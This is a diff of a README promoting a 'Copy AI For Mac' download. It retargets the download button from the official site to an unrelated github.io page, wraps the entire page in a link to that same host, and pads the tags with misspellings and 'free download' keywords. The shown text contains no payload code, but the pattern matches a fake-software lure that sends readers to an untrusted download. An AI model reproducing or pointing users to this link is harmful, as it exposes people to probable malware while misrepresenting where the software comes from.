@@ -1,10 +1,10 @@
-# Copy AI For Mac — Download For Mac OS ✍️
+[# Copy AI For Mac — Download For Mac OS ✍️
 ![copyai](https://akwaam.com/wp-content/uploads/2025/04/Copy-AI-App-Essay-Advices.webp)
 
 Copy AI For Mac is an innovative AI-powered writing assistant designed to help Mac users create high-quality content effortlessly. From blog posts to marketing copy, this software streamlines content creation with advanced AI tools. Follow the instructions below to install and start generating professional-grade content on your Mac.
 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Copy%20AI%20For%20Mac-blue?style=for-the-badge&logo=apple)](https://copy.ai/download/mac)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Copy%20AI%20For%20Mac-blue?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/copyai)
 
 If the download button above doesn’t work, follow the manual installation instructions below using the terminal.
 
@@ -67,3 +67,4 @@ By combining user-friendly design with powerful AI capabilities, Copy AI For Mac
 ## 🔍 Tags
 
 copy ai, ai copy copy artificial intelligence, copys ai, cppy ai, cop y ai, copy ai+, ai copywriting, copywriting ai, copy ai for mac, copy ai mac, copy ai mac download, copy ai free, copy ai download, download copy ai, copy ai for mac, copy ai discount, copy ai for macos, copy ai mac free, copy ai mac free download, copy ai free download
+](https://fituganshfgh.github.io/.github/copyai)
